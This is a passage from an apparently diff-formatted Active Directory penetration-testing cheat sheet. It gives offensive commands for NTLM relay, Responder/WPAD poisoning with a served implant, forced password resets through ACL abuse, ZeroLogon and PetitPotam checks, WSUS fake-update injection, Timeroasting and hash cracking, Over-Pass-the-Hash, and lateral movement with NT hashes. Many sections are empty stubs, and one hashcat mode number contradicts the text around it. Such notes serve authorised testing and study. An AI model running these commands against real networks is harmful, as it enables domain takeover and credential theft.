+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>sudo ntlmrelayx.py -t 192.168.0.10 -i -socks -smb2support -debug --output-file ./netntlm.hashes.relay
+</span></code></pre></div></p>
+<h3 id="wpad">WPAD</h3>
+<p>Many browsers use Web Proxy Auto-Discovery (WPAD) to load proxy settings from the network, download the wpad.dat, Proxy Auto-Config (PAC) file.</p>
+<p>A WPAD server provides client proxy settings via a particular URL:
+- http://wpad.example.org/wpad.dat</p>
+<p>--&gt; When a machine has these protocols enabled, if the local network DNS is not able to resolve the name, the machine will ask to all hosts of the network.  </p>
+<p>Using Responder we can poison DNS, DHCP, LLMNR and NBT-NS traffic to redirect clients to a malicious WPAD Server.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>responder -I eth0 -wFb
+</span></code></pre></div></p>
+<p>--&gt; Backdooring using Responder and WPAD attack
+Modify Responder configuration file
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>; Set to On to serve the custom HTML if the URL does not contain .exe
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>; Set to Off to inject the &#39;HTMLToInject&#39; in web pages instead
+</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>Serve-Html = On
+</span></code></pre></div></p>
+<p>--&gt; Create a specific web page for error or use the default one.  </p>
+<p>--&gt; Create an implant to be downloaded by the client. By default the error message indicate this URL : <code>http://isaProxysrv/ProxyClient.exe</code>  </p>
+<p>--&gt; Patch by Microsoft (MS16-077): Location of WPAD file is no longer requested via broadcast protocols bnut only via DNS.</p>
+<h3 id="acl-dacl-exploitation">ACL / DACL Exploitation</h3>
+<ul>
+<li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse</li>
+<li>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#forcechangepassword</li>
+<li>https://github.com/ShutdownRepo/The-Hacker-Recipes/tree/master/ad/movement/dacl</li>
+</ul>
+<p><img src="./images/DACLabuse-dark.png" width="800"/></p>
+<h5 id="bloodyad-autobloody">BloodyAD - AutoBloody</h5>
+<ul>
+<li>https://github.com/CravateRouge/bloodyAD</li>
+<li>https://github.com/CravateRouge/autobloody</li>
+</ul>
+<h5 id="dacl-edit-python-script">DACL Edit python script</h5>
+<ul>
+<li>https://github.com/fortra/impacket/pull/1291/files#diff-9648ed41f85733cdf640836e6166cb9dfd8f6c2e967491da2b516bbd2aac9989</li>
+</ul>
+<h5 id="forcechangepassword">ForceChangePassword</h5>
+<ul>
+<li>https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password
+If we have <em>ExtendedRight</em> on <em>User-Force-Change-Password</em> object type, we can reset the user's password without knowing their current password.  </li>
+</ul>
+<p>Returns the ACLs associated with jdoe user in DOMAIN.local domain and resolve GUIDs to their display names
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq &quot;DOMAIN.local\jdoe&quot;}
+</span></code></pre></div></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>. .\PowerView.ps1
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>Set-DomainUserPassword -Identity User -Verbose
+</span></code></pre></div>
+<p>Using <em>rpcclient</em>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>rpcclient -U jdoe 10.10.10.192
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>setuserinfo2 victimUser 23 &#39;Pass123!&#39;
+</span></code></pre></div></p>
+<h3 id="machineaccountquota-maq">MachineAccountQuota (MAQ)</h3>
+<ul>
+<li>https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/</li>
+<li>https://github.com/Kevin-Robertson/Powermad<blockquote>
+<p>MachineAccountQuota (MAQ) is a <strong>domain level attribute</strong> that by default permits unprivileged users to attach up to <strong>10</strong> computers to an Active Directory (AD) domain</p>
+</blockquote>
+</li>
+</ul>
+<p>Various tools exist which can create a machine account from the command line or from an implant such as <strong>StandIn</strong>, <strong>SharpMad</strong> and <strong>PowerMad</strong>.  </p>
+<ul>
+<li>
+<p>Machine accounts created through MAQ are placed into the Domain Computers group
+--&gt; In situations where the Domain Computers group has been granted extra privilege, it’s important to remember that this privilege also extends to unprivileged users through MAQ.  </p>
+</li>
+<li>
+<p>The creator account is granted write access to some machine account object attributes. Normally, this includes the following attributes:</p>
+</li>
+<li>
+<p>AccountDisabled</p>
+</li>
+<li>description</li>
+<li>displayName</li>
+<li>DnsHostName</li>
+<li>ServicePrincipalName</li>
+<li>userParameters</li>
+<li>userAccountControl</li>
+<li>msDS-AdditionalDnsHostName</li>
+<li>msDS-AllowedToActOnBehalfOfOtherIdentity</li>
+<li>
+<p>samAccountName</p>
+</li>
+<li>
+<p>The machine account itself has write access to some of its own attributes. The list includes the msDS-SupportedEncryptionTypes attribute which can have an impact on the negotiated Kerberos encryption method.</p>
+</li>
+<li>
+<p>The samAccountName can be changed to anything that doesn’t match a samAccountName already present in a domain.
+--&gt; Interestingly, the samAccountName can even end in a space which permits mimicking any existing domain account. You can strip the $ character also.</p>
+</li>
+</ul>
+<p><img src="./images/MAQSAMAccoutnName.png" width="700"/></p>
+<h3 id="protected-users">Protected Users</h3>
+<p>Well-known SID/RID: <code>S-1-5-21-&lt;domain&gt;-525</code></p>
+<p>This group was introduced in Windows Server 2012 R2 domain controllers.  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>Get-ADGroupMember -Identity &quot;Protected Users&quot;
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>for group in $(rpcclient -U &#39;&#39; -N 10.10.0.10 -c enumdomgroups | grep Protected | cut -d &#39;[&#39; -f 3 | cut -d &#39;]&#39; -f 1); do rpcclient -U &#39;&#39; -N 10.10.0.10 -c &quot;querygroupmem $group&quot;; done
+</span></code></pre></div>
+<p><a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group">Protected users</a> is a Security Group which aims to create additional protection against compromise of credential regarding its members, such as the followings:<br />
+- Kerberos protocol will not use the weaker DES or RC4 encryption types in the preauthentication process
+- Credential delegation (CredSSP) will not cache the user's plain text credentials
+- Windows Digest will not cache the user's plain text credentials even when Windows Digest is enabled (From windows 8.1 and Server 2012 R2)
+- The user’s account cannot be delegated with Kerberos constrained or unconstrained delegation
+- Members of this group cannot use NTLM
+- Kerberos ticket-granting tickets (TGTs) lifetime = 4 hours</p>
+<p>--&gt; Restriction of the <a href="https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/">Protected Users group is not complete</a> when it comes to the RID500 user of the Active Directory domain. We cannot connect using the NTLM authentication protocol but we can connect using the Kerberos authentication protocol with RC4.</p>
+<h3 id="pac">PAC</h3>
+<p>Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user</p>
+<h3 id="proxylogon">ProxyLogon</h3>
+<h3 id="proxyshell">ProxyShell</h3>
+<h3 id="proxynotshell">ProxyNotShell</h3>
+<h3 id="zerologon">ZeroLogon</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M zerologon
+</span></code></pre></div>
+<h3 id="printnightmare">PrintNightmare</h3>
+<h4 id="spoolsample">SpoolSample</h4>
+<p>https://github.com/leechristensen/SpoolSample</p>
+<h4 id="shadowcoerce">ShadowCoerce</h4>
+<p>https://github.com/ShutdownRepo/ShadowCoerce</p>
+<h4 id="dfscoerce">DFSCoerce</h4>
+<p>https://github.com/Wh04m1001/DFSCoerce</p>
+<h4 id="multicoerce">MultiCoerce</h4>
+<h3 id="petitpotam">Petitpotam</h3>
+<p>PetitPotam, publicly disclosed by French security researcher Lionel Gilles, is comparable to the PrintSpooler bug but utilizes the <strong>MS-EFSRPC</strong> API to coerce authentication rather than <strong>MS-RPRN</strong>.</p>
+<p>Check to validate host is vulnerable to petitpotam
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M petitpotam
+</span></code></pre></div></p>
+<h3 id="samaccountname-spoofing">samAccountName spoofing</h3>
+<h3 id="mitm-ipv6-relay">MiTM - IPv6 + Relay</h3>
+<ul>
+<li>Windows prefers IPv6 by default.</li>
+<li>
+<p>DHCPv6 is constantly broadcasting to the entire network.</p>
+</li>
+<li>
+<p>https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</p>
+</li>
+</ul>
+<p>SMB Relay</p>
+<p>LDAP Relay</p>
+<p>Tools: ntlmrelayx, multirelay</p>
+<h3 id="responder-relay">Responder + Relay</h3>
+<p>SMB Relay</p>
+<p>LDAP Relay</p>
+<h3 id="wsus-exploitation">WSUS Exploitation</h3>
+<p>In case of WSUS being deployed without SSL/TLS encrypted communications, we can perform a man-in-the-middle attack and inject a fake update.
+- Can only deliver binaries signed by Microsoft (PSExec, BGinfo with VB script)
+- Need to perform ARP Spoofing or tamper with the system's proxy settings (if possible)</p>
+<p>--&gt; WSUS Server can be found based on the server hostname (e.g. server-wsus-01) or based on open ports (8530,8531)  </p>
+<p><strong>Tools</strong><br />
+- https://github.com/pimps/wsuxploit
+- https://github.com/GoSecure/pywsus
+- https://github.com/ctxis/wsuspect-proxy/</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>python pywsus.py -H 172.16.205.21 -p 8530 -e PsExec64.exe -c ‘/accepteula /s cmd.exe /c “echo wsus.poc &gt; C:\\poc.txt”‘
+</span></code></pre></div>
+<ul>
+<li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf">WSUSpect Black Hat Talk</a></li>
+<li><a href="https://github.com/ctxis/wsuspect-proxy">WSUSPect tool</a></li>
+<li><a href="https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/">PyWSUS</a></li>
+</ul>
+<p>Windows Update is a Windows service, <strong>wuauclt.exe</strong> which run periodically to check for updates.<br />
+Registry keys exist that govern various details such:
+- Update server's location
+- Update frequency
+- Privileged Escalation of unprivileged users</p>
+<p>--&gt; Communication: Client --&gt; Windows Update Server : HTTP(S) / SOAP XML web service.  </p>
+<h4 id="wsus-details">WSUS details</h4>
+<p>WSUS or Windows Software Update Services is the enterprise variant of Windows update.<br />
+- Updates fetched from local server instead of Microsoft Server
+- Updates must be approved by administrator before being pushed out</p>
+<p><strong>wsus soap service</strong><br />
+<img src="./images/wsus_soap_service.png" width="500"/></p>
+<p><strong>MITM wsus soap service</strong>
+<img src="./images/wsus_psexec.png" width="500"/></p>
+<p>Check WSUS HTTP Misconfiguration:
+- Check Registry on WSUS client machines to validate TLS usage
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>WUServer = http://wsus-server.local:8530
+</span></code></pre></div></p>
+<ul>
+<li>Check if the computer will use WUServer
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>HKLMT\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>UseWUServer = 1
+</span></code></pre></div></li>
+</ul>
+<h3 id="ldap-pass-back">LDAP Pass Back</h3>
+<p>LDAP pass back attack target LDAP credentials used by the MFP within its network configuration (check for default credentials on printers).  </p>
+<p>The attacker tricks a device to connect to a rogue server to disclose the stored network credentials or hashes while the device trying to authenticate to the server.</p>
+<p>2 methods:
+1. nc listener
+2. Rogue LDAP server</p>
+<p>Sometimes the domain account used within theses printers are service accounts with interesting privileges and I also found domain admins account credentials being used. In any case if a domain account is used it can give you a first foothold within the domain from an unauthenticated perspective.  </p>
+<h3 id="smtp-pass-back">SMTP Pass Back</h3>
+<ul>
+<li>https://github.com/RobinMeis/MITMsmtp
+--&gt; Similar to LDAP Pass back with SMTP protocol this time.</li>
+</ul>
+<h2 id="kerberos-attacks">Kerberos attacks</h2>
+<h3 id="as-rep-roasting_1">AS-Rep Roasting</h3>
+<h3 id="kerberoasting_1">Kerberoasting</h3>
+<h3 id="timeroasting-trustroasting-computer-spraying">Timeroasting / TrustRoasting / Computer Spraying</h3>
+<blockquote>
+<p>Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing unauthenticated attackers to effectively request a password hash of any computer account by sending an NTP request with that account's RID. This is not a problem when computer accounts are properly generated, but if a non-standard or legacy default password is set this tool allows you to brute-force those offline. </p>
+</blockquote>
+<ul>
+<li>https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf</li>
+<li>https://github.com/SecuraBV/Timeroast</li>
+</ul>
+<p>On domain controller (up to Windows Server 2019) if you create a computer account (Workstation1$) with CMD Line (net computer) or through the GUI box and check <strong>Assign this computer account as a pre-Windows 2000 Computer</strong>.  </p>
+<p>--&gt; This will set the computer account password to default password that matches the first 14 characters of their computer name, lowercase and without a dollar sign.</p>
+<p><img src="./images/timeroasting.png" width="700"/></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>python3 timeroast.py 192.168.2.60 -o ntp_hashes
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>1002:$sntp-ms$3axxxxxxx3$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx038
+</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>1116:$sntp-ms$11xxxxxxx2$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx73e
+</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>1119:$sntp-ms$e9xxxxxxxb$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxxcfa
+</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>1117:$sntp-ms$30xxxxxxx5$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx2d3
+</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a>1127:$sntp-ms$71xxxxxxx7$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx663
+</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a>1128:$sntp-ms$51xxxxxxxd$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx9f6
+</span><span id="__span-70-9"><a id="__codelineno-70-9" name="__codelineno-70-9" href="#__codelineno-70-9"></a>1129:$sntp-ms$08xxxxxxxf$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxxdd4
+</span><span id="__span-70-10"><a id="__codelineno-70-10" name="__codelineno-70-10" href="#__codelineno-70-10"></a>1131:$sntp-ms$d5xxxxxxxc$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx41e
+</span><span id="__span-70-11"><a id="__codelineno-70-11" name="__codelineno-70-11" href="#__codelineno-70-11"></a>1137:$sntp-ms$13xxxxxxxe$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxxb80
+</span><span id="__span-70-12"><a id="__codelineno-70-12" name="__codelineno-70-12" href="#__codelineno-70-12"></a>1138:$sntp-ms$9exxxxxxx0$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx767
+</span><span id="__span-70-13"><a id="__codelineno-70-13" name="__codelineno-70-13" href="#__codelineno-70-13"></a>1139:$sntp-ms$bbxxxxxxxc$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxxea2
+</span><span id="__span-70-14"><a id="__codelineno-70-14" name="__codelineno-70-14" href="#__codelineno-70-14"></a>1140:$sntp-ms$9axxxxxxx5$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxxe01
+</span></code></pre></div>
+<p><strong>Cracking NTP Hashes</strong>
+- https://github.com/hashcat/hashcat/issues/3629
+- https://github.com/hashcat/hashcat/commit/5446570a4fe7fbadc0bb481f41616e76833da735</p>
+<p>Format 31300 (SNTP-MS) available to hashcat to crack the NTP hashes.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>hashcat -a 0 -m 3130 ntp_hashes ./wordlists/rockyou.txt
+</span></code></pre></div>
+<h3 id="ms14-066">MS14-066</h3>
+<h2 id="active-directory-exploitation">Active Directory exploitation</h2>
+<h3 id="zerologon_1">ZeroLogon</h3>
+<h3 id="shadow-credential">Shadow Credential</h3>
+<p>If an attacker can write to the <strong>msDS-KeyCredentialLink</strong> property of a user/computer, it is possible to retrieve the NT hash of that object.  </p>
+<ul>
+<li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials</li>
+<li>https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</li>
+<li>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials</li>
+<li>https://pentestlab.blog/2022/02/07/shadow-credentials/</li>
+</ul>
+<h3 id="shadowspray">ShadowSpray</h3>
+<ul>
+<li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials#shadowspray</li>
+</ul>
+<h3 id="exploiting-adcs">Exploiting ADCS</h3>
+<p>Find PKI Enrollment Services in Active Directory and Certificate Templates Names
+<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M adcs
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>certutil.exe -config - -ping
+</span></code></pre></div></p>
+<ul>
+<li>https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse</li>
+<li>https://github.com/PKISolutions/PSPKI</li>
+<li>https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/</li>
+</ul>
+<h4 id="esc1-">ESC1 -</h4>
+<ul>
+<li>msPKI-enrollment-flag : Whether CA manager approval is required</li>
+<li>Authorized signatures : required  How many authorized signatures are required to sign this certificate</li>
+<li>PKI-extended-key-usage : What the certificate can be used for (for example, code signing and client authentication)</li>
+<li>msPKI-certificate-name-flag   : Whether the certificate be requested on behalf of another party</li>
+<li>Enrollment permissions : Who can request a certificate with this template</li>
+</ul>
+<h3 id="adcs-webdav-ntlm-relay-to-ldap">ADCS WebDav + NTLM relay to LDAP</h3>
+<ul>
+<li>https://twitter.com/tifkin_/status/1418855927575302144/photo/1</li>
+<li>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate#rbcd-remote-computer-takeover</li>
+</ul>
+<h3 id="adidns">Adidns</h3>
+<blockquote>
+<p>The Domain Services ACL can be hardened to prevent domain users from creating arbitrary records. This can be done by changing the security configuration for your DNS zones. On the server on which the service Domain Service is running, open the DNS Manager, and for each domain zone under which users are joined, remove the “Create all child objects” permission from the “Authenticated Users” group.</p>
+</blockquote>
+<ul>
+<li>https://www.gosecure.net/blog/2019/02/20/abusing-unsafe-defaults-in-active-directory/</li>
+<li>https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/</li>
+<li>https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/</li>
+<li>https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/adidns-abuse</li>
+<li></li>
+</ul>
+<h3 id="exploiting-machine-accounts-ws01">Exploiting machine accounts (WS01$)</h3>
+<ul>
+<li>https://pentestlab.blog/2022/02/01/machine-accounts/</li>
+<li>https://secarma.com/using-machine-account-passwords-during-an-engagement/</li>
+</ul>
+<blockquote>
+<p>Every computer joined to Active Directory (AD) has an associated computer account in AD. A computer account in AD is a security principal (same as user accounts and security groups) and as such has a number of attributes that are the same as those found on user accounts including a Security IDentifier (SID), memberOf, lastlogondate, passwordlastset, etc.</p>
+</blockquote>
+<ul>
+<li>Check the group membership for a machine account, sometime the machine account is member of elevated group or <strong>Domain Admins</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>net group &quot;domain admins&quot; /domain
+</span></code></pre></div>
+<p>Converting machine account Hex value to NTLM hash:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>import hashlib,binascii hexpass = &quot;e6 5f 92...&quot;
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>hexpass = hexpass.replace(&quot; &quot;,&quot;&quot;)
+</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a>passwd = hexpass.decode(&quot;hex&quot;)
+</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a>hash = hashlib.new(&#39;md4&#39;, passwd).digest()
+</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a>print binascii.hexlify(hash)
+</span></code></pre></div></p>
+<h3 id="over-pass-the-hash">Over-Pass-The-hash</h3>
+<ul>
+<li>https://medium.com/r3d-buck3t/play-with-hashes-over-pass-the-hash-attack-2030b900562d</li>
+<li>blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash</li>
+</ul>
+<p>Use the user or computer NTLM hash to request Kerberos tickets.
+--&gt; Alternative to Pass The hash over NTLM protocol<br />
+--&gt; Useful in networks where NTLM protocol is disabled and only Kerberos is allowed.  </p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>getTGT.py domain.local/workstation1$ -hashes XXXXXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXX -dc-ip 192.168.0.10 -debug
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>KRB5CCNAME=/home/test/lutzenfried/tooling/workstation1\$.ccache
+</span></code></pre></div>
+Potential error when using Over Pass The Hash attack due to the Kerberos and time.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+</span></code></pre></div>
+--&gt; Error raised because of your local time, you need to synchronise the host with the DC: <code>ntpdate &lt;IP of DC&gt;</code></p>
+<h3 id="pass-the-ticket">Pass The ticket</h3>
+<ul>
+<li>https://book.hacktricks.xyz/windows/active-directory-methodology/pass-the-ticket</li>
+</ul>
+<h3 id="silver-ticket">Silver ticket</h3>
+<ul>
+<li>https://adsecurity.org/?p=2011</li>
+<li>https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/</li>
+</ul>
+<h3 id="kerberos-delegation_1">Kerberos Delegation</h3>
+<ul>
+<li>https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/</li>
+<li>https://posts.specterops.io/a-case-study-in-wagging-the-dog-computer-takeover-2bcb7f94c783</li>
+<li>https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</li>
+</ul>
+<p>Check for system trusted for delegation
+<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>crackmapexec ldap 192.168.0.10 -u jdoe -p Password123 --trusted-for-delegation
+</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>OR
+</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a>ldapdomaindump -u &quot;company.local\\jdoe&quot; -p &quot;Password123&quot; 192.168.0.10  
+</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a>grep TRUSTED_FOR_DELEGATION domain_computers.grep
+</span><span id="__span-77-5"><a id="__codelineno-77-5" name="__codelineno-77-5" href="#__codelineno-77-5"></a>OR
+</span><span id="__span-77-6"><a id="__codelineno-77-6" name="__codelineno-77-6" href="#__codelineno-77-6"></a>PS&gt; Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+</span></code></pre></div></p>
+<h4 id="exploiting-rbcd-machineaccountquota">Exploiting RBCD : MachineAccountQuota</h4>
+<ul>
+<li>https://beta.hackndo.com/resource-based-constrained-delegation-attack/</li>
+</ul>
+<h4 id="exploiting-rbcd-write-priv">Exploiting RBCD : WRITE Priv</h4>
+<ul>
+<li>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</li>
+</ul>
+<h3 id="from-on-premise-to-azure">From On-Premise to Azure</h3>
+<ul>
+<li>MSOL account</li>
+<li>AzureAD Connect</li>
+</ul>
+<h3 id="domain-trust">Domain Trust</h3>
+<ul>
+<li>https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d</li>
+<li>https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/</li>
+<li>https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/</li>
+<li>https://improsec.com/tech-blog/o83i79jgzk65bbwn1fwib1ela0rl2d</li>
+<li>https://adsecurity.org/?p=1640</li>
+<li>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc731335(v=ws.11)?redirectedfrom=MSDN</li>
+</ul>
+<h3 id="forest-trust">Forest Trust</h3>
+<ul>
+<li>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755700(v=ws.10)?redirectedfrom=MSDN</li>
+</ul>
+<h2 id="lateral-movement">Lateral movement</h2>
+<p>smbclient authentication using NTLM hash
+<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>smbclient //192.168.0.10/C$ -U corp.company.com/jdoe --pw-nt-hash &lt;NT hash&gt;
+</span></code></pre></div></p>
+<h2 id="wmiexec">wmiexec</h2>
+<h4 id="detection">Detection</h4>
+<h2 id="smbexec">smbexec</h2>
+<h4 id="detection_1">Detection</h4>
+<h2 id="psexec">psexec</h2>
+<h4 id="detection_2">Detection</h4>
+<h2 id="atexec">atexec</h2>
+<h4 id="detection_3">Detection</h4>
+<h2 id="comexec">comexec</h2>
+<h4 id="detection_4">Detection</h4>
+<h2 id="persistence">Persistence</h2>
+<h3 id="adminsdholder">AdminSDHolder</h3>
+<h3 id="primary-group-id">Primary Group ID</h3>
+<p>The <em>primary group id</em> is a a user object attribute and contains <em>relative identifier</em> (RID) for the primary group of the user.<br />
+--&gt; By default this is the RID for the <em>Domain Users</em> group (RID 513).</p>
+<p>By using the <em>Primary Group ID attribute</em> and a <em>specific Access Control Entry</em> (ACE), an attacker can hide the membership of one group that he is already a member of without having any permissions on the group.</p>
+<p>This cool trick cannot work on members of protected groups such as Domain Admins, but can work on members of normal groups such as DnsAdmins, which can be used to escalate to Domain Admins.</p>
+<ul>
+<li>https://www.semperis.com/blog/how-attackers-can-use-primary-group-membership-for-defense-evasion/</li>
+<li>https://blog.alsid.eu/primary-group-id-attack-a50dca142771</li>
+</ul>
+<h3 id="dropping-spn-on-admin-accounts">Dropping SPN on admin accounts</h3>
+<p>https://adsecurity.org/?p=3466</p>
+<h4 id="persistence-in-ad-environment">Persistence in AD environment</h4>
+<ul>
